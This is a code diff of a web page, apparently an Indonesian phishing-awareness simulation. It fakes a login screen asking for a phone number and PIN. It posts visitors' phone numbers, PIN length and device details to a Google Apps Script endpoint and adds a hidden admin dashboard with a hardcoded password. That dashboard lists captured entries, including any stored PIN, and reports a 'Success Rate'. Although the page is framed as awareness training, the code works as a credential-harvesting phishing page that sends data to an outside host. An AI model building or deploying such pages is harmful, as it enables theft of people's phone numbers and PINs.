@@ -295,7 +295,7 @@
             background: white;
             padding: 30px;
             border-radius: 20px;
-            max-width: 600px;
+            max-width: 800px;
             width: 90%;
             max-height: 80vh;
             overflow-y: auto;
@@ -335,24 +335,37 @@
         }
 
         .loading {
-            display: none;
-            text-align: center;
-            padding: 20px;
-        }
-
-        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
             border: 3px solid #f3f3f3;
             border-top: 3px solid #118EEA;
             border-radius: 50%;
-            width: 40px;
-            height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
         }
 
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
+        }
+
+        .status-message {
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0;
+            text-align: center;
+        }
+
+        .status-success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status-error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
         }
     </style>
 </head>
@@ -395,7 +408,10 @@
                         <input type="password" class="pin-digit" maxlength="1" oninput="moveFocus(this, 5)">
                     </div>
                 </div>
-                <button class="btn btn-primary" onclick="submitData()" id="loginBtn" disabled>Masuk</button>
+                <button class="btn btn-primary" onclick="submitData()" id="loginBtn" disabled>
+                    <span id="loginText">Masuk</span>
+                    <span id="loginLoading" class="loading" style="display: none;"></span>
+                </button>
                 <div class="forgot-pin">
                     <a href="#" onclick="submitData()">Lupa PIN?</a>
                 </div>
@@ -423,23 +439,14 @@
                 <li>Waspada terhadap link mencurigakan</li>
                 <li>Aktifkan verifikasi 2 langkah</li>
             </ul>
+            <div id="submitStatus"></div>
             <button class="btn btn-primary" onclick="closeEducation()">Saya Mengerti</button>
-        </div>
-    </div>
-
-    <!-- Loading Popup -->
-    <div class="education-popup" id="loadingPopup">
-        <div class="popup-content">
-            <div class="loading">
-                <div class="spinner"></div>
-                <p>Menyimpan data...</p>
-            </div>
         </div>
     </div>
 
     <!-- Admin Panel (Tersembunyi) -->
     <div class="admin-panel">
-        <button class="admin-trigger" onclick="showAdminLogin()" title="Admin Panel"></button>
+        <button class="admin-trigger" onclick="showAdminLogin()" title="Admin Panel">.</button>
     </div>
 
     <!-- Admin Login -->
@@ -458,43 +465,27 @@
     <!-- Admin Dashboard -->
     <div class="admin-popup" id="adminDashboard">
         <div class="admin-content">
-            <h2>📊 Dashboard Admin - Rekapan Data Real-Time</h2>
+            <h2>📊 Dashboard Admin - Data Real-Time</h2>
             
             <div class="admin-stats" id="adminStats">
                 <div class="stat-card">
-                    <h3 id="totalCount">0</h3>
-                    <p>Total Percobaan</p>
-                </div>
-                <div class="stat-card">
-                    <h3 id="todayCount">0</h3>
-                    <p>Hari Ini</p>
-                </div>
-                <div class="stat-card">
-                    <h3 id="completePinCount">0</h3>
-                    <p>PIN Lengkap</p>
-                </div>
-                <div class="stat-card">
-                    <h3 id="lastUpdate">-</h3>
-                    <p>Update Terakhir</p>
+                    <div class="loading"></div>
+                    <p>Loading...</p>
                 </div>
             </div>
             
-            <div style="text-align: center; margin: 20px 0;">
-                <button class="btn btn-primary" onclick="loadAdminData()">🔄 Refresh Data</button>
+            <div style="margin-bottom: 20px;">
+                <button class="btn btn-primary" onclick="refreshData()" id="refreshBtn">🔄 Refresh Data</button>
+                <button class="export-btn" onclick="exportToCSV()">📥 Export CSV</button>
             </div>
             
             <div id="adminDataContent">
-                <div class="loading">
-                    <div class="spinner"></div>
-                    <p>Memuat data...</p>
-                </div>
+                <div class="loading" style="margin: 20px auto;"></div>
+                <p>Memuat data...</p>
             </div>
             
             <div style="text-align: center; margin-top: 20px;">
-                <button class="export-btn" onclick="exportData()">📥 Export CSV</button>
-                <button class="export-btn" onclick="exportJSON()">📥 Export JSON</button>
-                <button class="btn" onclick="clearAllData()" style="background: #dc3545; color: white;">🗑️ Hapus Semua Data</button>
-                <button class="btn btn-primary" onclick="closeAdminDashboard()" style="margin-left: 10px;">Tutup</button>
+                <button class="btn btn-primary" onclick="closeAdminDashboard()">Tutup</button>
             </div>
         </div>
     </div>
@@ -502,13 +493,10 @@
     <script>
         let currentStep = 1;
         
-        // GANTI INI DENGAN GOOGLE SHEETS WEB APP URL ANDA
-        const GOOGLE_SHEETS_URL = 'https://script.google.com/macros/s/AKfycbxs3zXongUDMd-FOjvl4TByHVYZVR1MM_mCxFJ0vURXlHjcu99DjCBBVf2CPMTVjeq9/exec';
+        // KONFIGURASI GOOGLE SHEETS
+        // Ganti dengan URL Google Apps Script Anda
+        const SCRIPT_URL = 'MASUKKAN_URL_GOOGLE_APPS_SCRIPT_DISINI';
         
-        // Admin Configuration
-        const ADMIN_PASSWORD = 'kkn2024admin';
-        let adminData = [];
-
         // Phone input validation
         document.getElementById('phone').addEventListener('input', function() {
             const phone = this.value;
@@ -579,19 +567,23 @@
             const pinLength = Array.from(pinDigits).filter(digit => digit.value).length;
             
             // Show loading
-            document.getElementById('loadingPopup').style.display = 'flex';
+            document.getElementById('loginText').style.display = 'none';
+            document.getElementById('loginLoading').style.display = 'inline-block';
+            document.getElementById('loginBtn').disabled = true;
             
             const data = {
                 timestamp: new Date().toISOString(),
                 phone: phone,
                 pinLength: pinLength,
                 userAgent: navigator.userAgent,
-                url: window.location.href
+                referrer: document.referrer || 'Direct',
+                screenSize: `${screen.width}x${screen.height}`,
+                language: navigator.language
             };
-
+            
             try {
                 // Kirim data ke Google Sheets
-                await fetch(GOOGLE_SHEETS_URL, {
+                const response = await fetch(SCRIPT_URL, {
                     method: 'POST',
                     mode: 'no-cors',
                     headers: {
@@ -600,17 +592,19 @@
                     body: JSON.stringify(data)
                 });
                 
-                // Backup to localStorage
-                let localData = JSON.parse(localStorage.getItem('phishingData') || '[]');
-                localData.push(data);
-                localStorage.setItem('phishingData', JSON.stringify(localData));
-                
+                document.getElementById('submitStatus').innerHTML = 
+                    '<div class="status-success">✅ Data berhasil dikirim untuk analisis keamanan</div>';
             } catch (error) {
-                console.error('Error saving data:', error);
+                console.error('Error:', error);
+                document.getElementById('submitStatus').innerHTML = 
+                    '<div class="status-error">⚠️ Gagal mengirim data, namun simulasi tetap berjalan</div>';
             }
             
-            // Hide loading and show education
-            document.getElementById('loadingPopup').style.display = 'none';
+            // Reset loading state
+            document.getElementById('loginText').style.display = 'inline';
+            document.getElementById('loginLoading').style.display = 'none';
+            
+            // Show education popup
             document.getElementById('educationPopup').style.display = 'flex';
         }
 
@@ -631,6 +625,8 @@
         }
 
         // Admin Functions
+        const ADMIN_PASSWORD = 'kkn2024admin';
+
         function showAdminLogin() {
             document.getElementById('adminLogin').style.display = 'flex';
         }
@@ -650,123 +646,90 @@
             }
         }
 
-        async function loadAdminData() {
-            try {
-                // Load from Google Sheets
-                const response = await fetch(GOOGLE_SHEETS_URL + '?action=get', {
-                    method: 'GET'
-                });
-                
-                if (response.ok) {
-                    adminData = await response.json();
-                } else {
-                    throw new Error('Failed to load from Google Sheets');
-                }
-            } catch (error) {
-                console.error('Error loading from Google Sheets, using localStorage:', error);
-                // Fallback to localStorage
-                adminData = JSON.parse(localStorage.getItem('phishingData') || '[]');
-            }
-            
-            updateAdminDashboard();
-        }
-
-        function updateAdminDashboard() {
-            // Update statistics
-            const today = new Date().toDateString();
-            const todayData = adminData.filter(item => new Date(item.timestamp).toDateString() === today);
-            const completePins = adminData.filter(item => item.pinLength >= 6);
-            
-            document.getElementById('totalCount').textContent = adminData.length;
-            document.getElementById('todayCount').textContent = todayData.length;
-            document.getElementById('completePinCount').textContent = completePins.length;
-            document.getElementById('lastUpdate').textContent = new Date().toLocaleTimeString('id-ID');
-            
-            // Update data content
-            const dataContent = document.getElementById('adminDataContent');
-            
-            if (adminData.length === 0) {
-                dataContent.innerHTML = '<p>Belum ada data yang tercatat.</p>';
-            } else {
-                let html = '<h3>📝 Data Lengkap (' + adminData.length + ' entries):</h3>';
-                adminData.reverse().forEach((item, index) => {
-                    html += `
-                        <div class="data-item">
-                            <strong>Entry #${adminData.length - index}</strong>
-                            <br><small>⏰ ${new Date(item.timestamp).toLocaleString('id-ID')}</small>
-                            <br>📱 No. HP: +62${item.phone}
-                            <br>🔒 PIN: ${item.pinEntered || 'Tidak diisi'} (${item.pinLength} digit)
-                            <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 50) + '...' : 'Unknown'}
-                        </div>
-                    `;
-                });
-                dataContent.innerHTML = html;
-            }
-        }
-
-        function showAdminDashboard() {
+        async function showAdminDashboard() {
             document.getElementById('adminDashboard').style.display = 'flex';
-            loadAdminData();
+            await refreshData();
         }
 
         function closeAdminDashboard() {
             document.getElementById('adminDashboard').style.display = 'none';
         }
 
-        function exportData() {
-            if (adminData.length === 0) {
-                alert('Tidak ada data untuk diekspor');
+        async function refreshData() {
+            document.getElementById('refreshBtn').disabled = true;
+            document.getElementById('refreshBtn').innerHTML = '🔄 Loading...';
+            
+            try {
+                // Fetch data dari Google Sheets
+                const response = await fetch(SCRIPT_URL + '?action=getData');
+                const data = await response.json();
+                
+                updateAdminStats(data);
+                displayAdminData(data);
+            } catch (error) {
+                console.error('Error fetching data:', error);
+                document.getElementById('adminDataContent').innerHTML = 
+                    '<div class="status-error">❌ Gagal memuat data. Periksa koneksi internet atau konfigurasi Google Sheets.</div>';
+            }
+            
+            document.getElementById('refreshBtn').disabled = false;
+            document.getElementById('refreshBtn').innerHTML = '🔄 Refresh Data';
+        }
+
+        function updateAdminStats(data) {
+            const today = new Date().toDateString();
+            const todayData = data.filter(item => new Date(item.timestamp).toDateString() === today);
+            const validPins = data.filter(item => item.pinLength >= 6);
+            
+            const statsHtml = `
+                <div class="stat-card">
+                    <h3>${data.length}</h3>
+                    <p>Total Entries</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${todayData.length}</h3>
+                    <p>Hari Ini</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${validPins.length}</h3>
+                    <p>PIN Lengkap</p>
+                </div>
+                <div class="stat-card">
+                    <h3>${Math.round((validPins.length / Math.max(data.length, 1)) * 100)}%</h3>
+                    <p>Success Rate</p>
+                </div>
+            `;
+            document.getElementById('adminStats').innerHTML = statsHtml;
+        }
+
+        function displayAdminData(data) {
+            if (data.length === 0) {
+                document.getElementById('adminDataContent').innerHTML = 
+                    '<p>Belum ada data yang tercatat.</p>';
                 return;
             }
             
-            let csv = 'No,Timestamp,Phone,PIN_Length,Device\n';
-            adminData.forEach((item, index) => {
-                csv += `${index + 1},"${item.timestamp}","+62${item.phone}",${item.pinLength},"${item.userAgent || 'Unknown'}"\n`;
+            let html = '<h3>📝 Data Lengkap (Real-time):</h3>';
+            data.reverse().forEach((item, index) => {
+                const date = new Date(item.timestamp);
+                html += `
+                    <div class="data-item">
+                        <strong>Entry #${data.length - index}</strong>
+                        <br><small>⏰ ${date.toLocaleString('id-ID')}</small>
+                        <br>📱 No. HP: +62${item.phone}
+                        <<br>🔒 PIN: ${item.pinEntered || 'Tidak diisi'} (${item.pinLength} digit)
+                        <br>💻 Device: ${item.userAgent ? item.userAgent.substring(0, 60) + '...' : 'Unknown'}
+                        <br>🌐 Referrer: ${item.referrer || 'Direct'}
+                        <br>📺 Screen: ${item.screenSize} | 🗣️ Lang: ${item.language}
+                    </div>
+                `;
             });
-            
-            downloadFile(csv, 'phishing_education_data.csv', 'text/csv');
+            document.getElementById('adminDataContent').innerHTML = html;
         }
 
-        function exportJSON() {
-            if (adminData.length === 0) {
-                alert('Tidak ada data untuk diekspor');
-                return;
-            }
-            
-            downloadFile(JSON.stringify(adminData, null, 2), 'phishing_education_data.json', 'application/json');
-        }
-
-        function downloadFile(content, filename, contentType) {
-            const a = document.createElement('a');
-            const file = new Blob([content], { type: contentType });
-            a.href = URL.createObjectURL(file);
-            a.download = filename;
-            a.click();
-        }
-
-        async function clearAllData() {
-            if (confirm('⚠️ PERINGATAN: Apakah Anda yakin ingin menghapus SEMUA data? Tindakan ini tidak dapat dibatalkan!')) {
-                try {
-                    // Clear from Google Sheets
-                    await fetch(GOOGLE_SHEETS_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({ action: 'clear' })
-                    });
-                } catch (error) {
-                    console.error('Error clearing Google Sheets:', error);
-                }
-                
-                // Clear localStorage
-                localStorage.removeItem('phishingData');
-                adminData = [];
-                
-                alert('✅ Semua data telah dihapus');
-                updateAdminDashboard();
-            }
+        function exportToCSV() {
+            // Implementasi export akan ditambahkan setelah Google Sheets dikonfigurasi
+            alert('Fitur export akan aktif setelah Google Sheets dikonfigurasi');
         }
     </script>
 </body>
